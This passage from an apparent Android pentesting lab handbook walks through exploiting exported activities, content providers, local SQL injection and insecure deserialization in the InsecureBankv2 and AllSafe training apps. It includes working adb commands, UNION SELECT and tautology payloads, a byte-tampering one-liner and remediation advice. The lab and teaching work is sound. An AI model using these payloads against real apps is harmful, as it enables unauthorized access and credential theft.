  • am = Activity Manager, the OS service whose job is starting components.
  • start = tell it to start an activity.
  • -n = "I'm naming the exact component" (package/class).

The whole thing means: "OS, start the PostLogin screen of InsecureBankv2 for me." The OS checks whether it's exported, sees true, and opens it. If it were exported="false", we'd get a permission denial.

why the manifest flag is the real evidence adb shell runs as the special shell user (UID 2000), which Android grants elevated privileges a normal third-party app never gets, so am start from adb can open a component marked exported="false" that an attacker's app would be denied (even more so under adb root, which we use here). That means "it opened from adb" proves nothing on its own. The exported="true" line in the manifest is what proves an unprivileged app could do it too, so that line is our evidence, not the successful command.

A stronger find. We strengthen the finding by reaching a screen that lets us do something, rather than just show a menu (though that menu is already a solid find).

adb shell am start -n com.android.insecurebankv2/.DoTransfer

From PowerShell we launched a screen that should have required authentication. When we write the report we confirm the class names, since they vary between builds.

2. Exported Content Provider (InsecureBankv2)

The process is: Exported → Dump → Error-proof → Tautology.

Step 1 - confirm the provider is exported. In AndroidManifest.xml we see it exported as true.

Since it's exported, let's dump the provider with no auth.

adb shell content query --uri content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers

content query is a command-line tool built into Android that talks to a Content Provider directly, the same way an app would through the ContentResolver API. Now, how did we know to add trackerusers? It's not in the manifest. The key concept is that a content:// URI has two parts:

content://com.android.insecurebankv2.TrackUserContentProvider / trackerusers
          <----------- authority ----------->   <-- path -->

The authority, com.android.insecurebankv2.TrackUserContentProvider, is in the manifest (the android:authorities= line in a previous screenshot). Paths are defined in the provider's code, which we get from opening the provider class in jadx.

By double-clicking com.android.insecurebankv2.TrackUserContentProvider we go straight to the decompiled class. Searching for addURI shows it declares the trackerusers path, and the query reads from a table named names.

Step 2 - dump the provider with no auth.

This shows dinesh, which means any app can read this with no login required. We know these credentials from earlier sections, so now let's prove injection.

Step 3 - error-based injection proof.

This error leaks the raw query, SELECT * FROM names WHERE (name=dinesh)..., because the shell strips the quotes and SQLite reads dinesh as a column. The error is proof that the query is concatenated. A properly parameterized provider would bind our input as a value and simply return nothing, so it could never throw this error.

Step 4 - confirm the tautology. A tautology is a statement that is always true.

We went inside the device shell and, without typing dinesh, wrote name='x' or '1'='1'. How did dinesh show up when we didn't write it? The whole condition reads "the name is x OR something that's always true." Because 1=1 is always true, the entire WHERE clause is always true for every row, so the filter becomes meaningless and the database hands back everything. This is the classic SQLi tautology; ' OR '1'='1 is the most famous string in web security for exactly this reason. The error proved our input reaches the SQL compiler and is treated as SQL rather than data; the tautology proves we can control the query's logic and pull rows we shouldn't get. (Weaponizing this into a full extraction of the credential table with UNION SELECT is a code-injection job, so we cover it in the next section.)

How it worked. The app "authorizes" us by checking our input against a secret, but the secret is a hardcoded string baked into the APK's resources, which anyone can read, and the check runs client-side on a device we control. So the gate is theater: an attacker reads R.string.key from the binary, then fires allsafe://infosecadventures/congrats?key=<that key> from any web page a victim taps, because the component is exported and BROWSABLE. Three risks converge on this one component: M4 (input drives a gated action validated against a non-secret), M8 (exported/BROWSABLE, reachable externally), and insecure logging of the full URI (M9, from Recon).

5. WebView Misconfiguration (AllSafe)

This is a big one, so let's focus. AllSafe's VulnerableWebView is the file-disclosure and XSS variant.

Remediation

The specific fixes for what we found, then the general controls every app should apply for M4 and M8.

For the flaws in this section:

  • Exported activities (M8): set exported="false" on every screen that isn't deliberately public, guard the rest with a signature-level permission, and re-check the session inside each sensitive Activity instead of trusting the navigation flow.
  • Exported content provider (M8/M4): don't export the provider unless another app genuinely needs it, and parameterize every query with bound selectionArgs so input can never be compiled as SQL.
  • Exported broadcast receiver (M8/M4): stop exporting it or require a signature permission, authenticate the request, and never take a destination phone number or new password from untrusted extras. Remove the credential from the log entirely.
  • Deep link gate (M4): never authorize against a client-side secret; validate and allow-list the parameters and enforce the real check server-side, and stop logging request URIs.
  • Unsafe WebView (M4): disable file access (setAllowFileAccess(false) and the file-URL variants), never render caller-supplied content, allow-list any URL you load, and remove addJavascriptInterface or expose only a minimal annotated interface to trusted content.
  • Debuggable / backup (M8): ship with debuggable="false" and allowBackup="false" (or explicit backup rules that exclude sensitive data).

General M4 (Insufficient Input/Output Validation) controls, most important first:

  • Most applicable here: treat every Intent, deep-link parameter, and WebView-loaded URL as attacker-controlled input; validate and allow-list it at the boundary, and keep the sink unreachable from outside unless it must be.
  • Use parameterized queries everywhere; never concatenate input into SQL, file paths, or shell strings.
  • In WebViews, disable JavaScript and file access unless required, and only ever load trusted, app-bundled content.
  • Enforce the real authorization on the server; a client-side check is UI convenience, not a security boundary.

General M8 (Security Misconfiguration) controls, most important first:

  • Most applicable here: export nothing by default; set android:exported="false" on every component that other apps don't need, and guard the ones that must be public with a signature-level permission.
  • Strip debug configuration from release builds (debuggable="false", no verbose logging).
  • Disable backup of sensitive data (allowBackup="false" or backup rules).
  • Prefer App/Universal Links (verified domain association) over raw custom schemes for anything sensitive.

Chapter Summary

We showed five ways to walk through the doors an app opens to the rest of the device, all on our own lab targets in place of the handbook's DIVA and OVAA:

  • Exported Activity (InsecureBankv2) - launched the authenticated dashboard and a transfer screen with am start, no login.
  • Exported Content Provider (InsecureBankv2) - dumped a table with no auth via content query, then proved SQL injection with an error leak and a tautology.
  • Exported Broadcast Receiver (InsecureBankv2) - reset the account password and exfiltrated the credential over SMS with a single am broadcast.
  • Deep Link (AllSafe) - passed a client-side gate from outside the app using a hardcoded key, and confirmed the secret URI is logged.
  • Unsafe WebView (AllSafe) - read the app's private user.xml credentials with a file:// payload and executed arbitrary JavaScript.

The throughline: an exported component with no permission guard, or a WebView that trusts what it loads, is an open door. The manifest is where you find the doors, and the code is where you learn what walking through each one does.

07Code-Level Bugs & Injection

MASVS: CODE  ·  Mobile Top 10: M4

Concept

When we talk about injection bugs, they usually have the same form:

  • A source - where our input goes in.
  • A sink - where that input gets treated as a query, a path, or code.
  • The missing validation between those two.

When an app pastes our raw input into that sink, we can break out of the spot we were given and change what the entire operation does. On the web, the sink is usually a remote SQL server. On mobile, the sinks are local and live inside the app itself: an SQLite database, a content provider, a file-path builder, an Intent, and a WebView.

In the previous chapter we covered what happens when that "door" is left open (exported components). This chapter covers what happens once we are through the door. The same 1=1 logic used in web SQLi, aimed at a local database and a content provider, plus navigating the app's sandbox and eventually out of it with ../ path traversal.

MASVS: CODE  ·  primary risk M4 (with M8 and M10 turning up along the way).

1. Local SQL Injection (AllSafe)

Let's navigate to AllSafe's SQL Injection challenge to practice our first exploit.

AllSafe already tells us we don't need reverse engineering, so using the login portal in the challenge we can attempt our SQL injection.

Step 1 - open the challenge in jadx. We could just throw every trick we know at the box from the start, but we save time (and get proof of the vulnerability) by reading the code first. We want a rawQuery / query( built by string concatenation. rawQuery (and execSQL) runs a raw SQL string we assemble ourselves. That is our dangerous sink.

Step 2 - find the string and analyze how the app filters queries. Here is the useful line:

$db.rawQuery("select * from user where username = '" + $username.getText() + "' and password = '" + this$0.md5(...) + "'", null);

We note the table name and whether our input sits inside single quotes. The important part:

... username = '" + $username.getText() + "' ...

This is our injection point. Our $username.getText() is pasted straight between single quotes with no binding, so a ' in our input breaks out of the string and the rest is read as pure SQL.

  • The table is user, and it reads getString(1) as username and getString(2) as password. The columns are (id, username, password).
  • The password field is MD5-hashed before it is inserted (this$0.md5()), so we can't cleanly inject through password. That makes the username field our injectable one.

Step 3 - craft our payload based on that assessment. If we type ' OR '1'='1, the query becomes:

... where username = '' OR '1'='1' and password = '<hash>'

AND binds tighter than OR, so that reads as "the username is empty, OR (1=1 AND password matches)." We would only get rows whose password hash matches, so we have to kill the trailing password condition with a comment. In the username box we enter:

' OR '1'='1' --

(Note the space after --.) This makes the query:

... where username = '' OR '1'='1' -- ' and password = '<hash>'

The -- comments out everything after it, so the password check is gone and the OR '1'='1' returns every row in user. The password box can be anything.

Step 4 - run the payload.

Our query went through, and the message the app spat out has the credentials for an admin and an unsalted MD5 hash that reverses back to admin. (We can log the unsalted MD5 hash as a bonus M10 finding, a nod to our Broken Cryptography chapter.) We can also confirm it by opening the database itself and reading the credentials directly.

This is a classic SQL Injection (M4) finding. The root cause is the username being concatenated into a rawQuery.

2. Content-provider full extraction (InsecureBankv2)

In Chapter 7 we identified that the provider is injectable. Now we exploit that into a full database extraction.

Step 0 - recall the query shape. From the previous chapter, the provider builds SELECT * FROM names WHERE (<your input>) ORDER BY name. Two things shape every payload:

  • The projection is * on names, which is 2 columns (id, name), so any UNION SELECT must also return 2 columns.
  • Our input sits inside parentheses with a trailing ORDER BY, so we close the parenthesis and comment the rest.

Step 1 - drop into the device shell.

adb shell

Step 2 - confirm the column count and the injection point with a dummy UNION. If it returns a row showing 1 and 2, we have confirmed 2 columns and that the break-out works:

content query --uri content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers --where "1=0) UNION SELECT 1,2 --"

(The 1=0 kills the real rows so we only see our injected row; the ) closes the wrapper paren; -- comments the trailing ) ORDER BY name.)

Row: 0 id=1, name=2 confirms it: 2 columns, and our injected literals came back in the id/name slots. The UNION break-out works and the column count matches.

Step 3 - dump the entire schema using SQLite's metadata table (sqlite_master is SQLite's version of web's information_schema). This lists every table and its CREATE statement, proving we can read beyond the intended names table:

content query --uri content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers --where "1=0) UNION SELECT name, sql FROM sqlite_master --"
  • android_metadata (locale TEXT) - SQLite housekeeping, not app data.
  • names (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT NOT NULL) - the one real app table.
  • sqlite_sequence(name,seq) - SQLite's autoincrement bookkeeping, also internal.

This proves we can read arbitrary tables, not just the one the provider intended to expose. (A full schema dump naturally includes the SQLite internals above.)

Step 4 - swap in the real column and table names from Step 3 (table names, columns id and name):

content query --uri content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers --where "1=0) UNION SELECT id, name FROM names --"

To make the arbitrary read obvious, we can concatenate our own text into the output:

content query --uri content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers --where "1=0) UNION SELECT id, 'table='||name FROM names --"

SQLite uses || for concatenation. This prints table=dinesh rows, making it obvious the second column is attacker-shaped output, not the provider's normal response.

3. Insecure Deserialization (AllSafe)

First, what is deserialization? Serialization is taking a live object (data in the app's memory, like a User with a role, password, and so on) and flattening it into a stream of bytes we can save to a file. Deserialization is the reverse: turning those bytes back into a live object.

AllSafe's challenge lets us prove insecure deserialization:

  • Save - a button that makes a User with role = ROLE_AUTHOR, serializes it, and writes it to user.dat.
  • Load - a button that reads user.dat back into a User, then checks if our role is EDITOR. If it is, access is granted.

The app trusts the role stored in the file, even though the file lives on external storage that we can read and write. So we edit the file, change AUTHOR to EDITOR, and when the app deserializes it, it thinks we're an editor. It never signs the file and never re-checks with a server. It just trusts the bytes and reads them back believing whatever they say. Comparing it to a website, it's as if we took a cookie with role=user, edited it to role=admin, and the server believed us.

Analyze the code. Step 1 - find the class and confirm serialization. Open the source for ObjectSerialization in jadx. Serialization sinks always show these tells:

  • Writing: ObjectOutputStream + writeObject(...)
  • Reading: ObjectInputStream + readObject(...)
  • A class marked implements Serializable

All of the above are present, confirming serialization.

Step 2 - find where the file goes. Where the file lives decides exploitability. In onCreateView, read the path line:

final String path = requireActivity().getExternalFilesDir(null) + "/user.dat";
  • getExternalFilesDir - external storage. Anyone (or any app with storage access) can read or write it. If it were internal only (getFilesDir) the attack would be harder.
  • user.dat is the file name (small detail, but useful to note).

Step 3 - read the Save handler (lambda$onCreateView$0).

User user = new User(username.getText()..., password.getText()...);
... oos.writeObject(user);

It builds the object and serializes it, but never signs, encrypts, or checksums it. Just raw bytes.

Step 4 - open the User class.

  • There is a role field, and it defaults to ROLE_AUTHOR.
  • The access decision is made entirely on the role field of the object deserialized from our file. No server check or signature anywhere.
  • The value it wants is ROLE_EDITOR. That is our target.

Prove insecure deserialization. From our assessment: the file is on storage we control, it holds a role, and the app trusts that role on load. So we change ROLE_AUTHOR to ROLE_EDITOR in user.dat and reload.

Step 1 - save credentials through the app.

We enter anthony and sudohi and hit Save. This writes user.dat (role ROLE_AUTHOR) to external storage.

Step 2 - pull user.dat to the desktop.

adb pull /sdcard/Android/data/infosecadventures.allsafe/files/user.dat .

Step 3 - change AUTHOR to EDITOR. Python here, but any editor works (PowerShell, a hex editor). Both strings are 11 characters, so the swap keeps the serialized length fields valid.

python -c "d=open('user.dat','rb').read().replace(b'ROLE_AUTHOR',b'ROLE_EDITOR');open('user.dat','wb').write(d)"

This confirms it was successfully changed to EDITOR.

Step 4 - push it back.

Step 5 - confirm it landed with the role intact.

Step 6 - trigger it. We hit Load, expecting a "Good job!" and a Toast, and... nothing happened. So something was wrong with our approach. Let's clear the log, hit Load again, and watch what the app does:

adb logcat -c
adb logcat -d | findstr /i "allsafe Exception Serial ROLE"

EACCES (Permission denied) plus a SELinux avc: denied { read }. Our push worked, but the app can't read the file we pushed.

why the app can't read our file (SELinux) On modern Android, every app's Android/data/<pkg> folder gets per-app SELinux categories (c174,c256,c512,c768). A file the app creates inherits those categories, so the app can read it. A file adb push creates gets a generic storage_file label without those categories, so SELinux blocks the app from reading it. Our role edit was fine; the problem was the file's label, because we created a new file instead of modifying the app's own.

The fix is to write our bytes into the file the app already owns so the label stays preserved, instead of pushing a fresh file over the top.

Fix Step 1 - remove the mislabeled file.

adb shell "rm /storage/emulated/0/Android/data/infosecadventures.allsafe/files/user.dat"

Fix Step 2 - Save again in the app (different creds this time, to confirm it's a new file).

Fix Step 3 - confirm the correct labels are on the file.

adb shell "ls -Z /storage/emulated/0/Android/data/infosecadventures.allsafe/files/"

The categories are there this time. When we hit Load we now get a proper error message, which means the app is reading the file with the correct categories and denying us based on the AUTHOR role. Good.

Fix Step 4 - overwrite the contents in place and push. Because cat > existingfile writes into the file the app created (same inode, same label), the app can still read it.

adb push "$env:USERPROFILE\Desktop\user.dat" /data/local/tmp/mod.dat
adb shell "cat /data/local/tmp/mod.dat > /storage/emulated/0/Android/data/infosecadventures.allsafe/files/user.dat"

(We overwrite with the edited file from earlier, so a successful load shows our original tampered credentials.)

Fix Step 5 - hit Load.

Success. The Toast shows role='ROLE_EDITOR', and note it shows our tampered anthony identity, not the credentials we typed on the last Save. That is the vulnerability stated by the app itself: the identity and role came entirely from the file we controlled, not from anything we logged in as. Load reads the file, never the input boxes.

Making mistakes really does solidify these concepts. We saw that pushing a fresh user.dat created a new file without the SELinux categories the app uses to read it, which is why the fix had to recreate and overwrite in place. We would not have learned about those categories were it not for that little mistake.

A note on path traversal

The handbook's DIVA lab has a screen that reads a file from a path we type with no checks, so ../ climbs out of the app and reads arbitrary files. None of my three targets (AllSafe, InsecureBankv2, AndroGoat) expose that sink. I searched their code for file reads built from user input and found none, so I could not reproduce classic path traversal here. I am documenting the pattern for completeness. It is the mobile version of web LFI and directory traversal: the same bug, but the sink is a local file API instead of a web server, and the input arrives from a text field, an intent, or a deep link. A payload like ../../../../etc/hosts would read a system file outside the sandbox, and ../databases/x.db or ../shared_prefs/y.xml would pivot to the app's own secrets. The fix is canonicalize then allowlist: resolve the final path and confirm it still sits inside the intended directory. I did demonstrate the same underlying primitive, arbitrary file read from unvalidated input, in the Platform chapter, where AllSafe's WebView loaded file:///data/data/infosecadventures.allsafe/shared_prefs/user.xml and rendered the app's private credentials.

Chapter Summary

We walked through the injection family, with the sinks living inside the app rather than on a remote server:

  • Local SQL injection (AllSafe) - a concatenated rawQuery let ' OR '1'='1' -- bypass the login and dump every user, with the passwords stored as crackable unsalted MD5.
  • Content-provider extraction (InsecureBankv2) - a UNION against sqlite_master turned Chapter 7's "it's injectable" into a full, cross-app schema and table read.

  • Path traversal - documented as the pattern, since none of our targets expose the sink; the same arbitrary-file-read primitive was shown via the WebView in the Platform chapter.

The throughline is one sentence: the app took input and used it in a sensitive operation without validating it. Name the source, the sink, and the missing validation, and the finding writes itself.
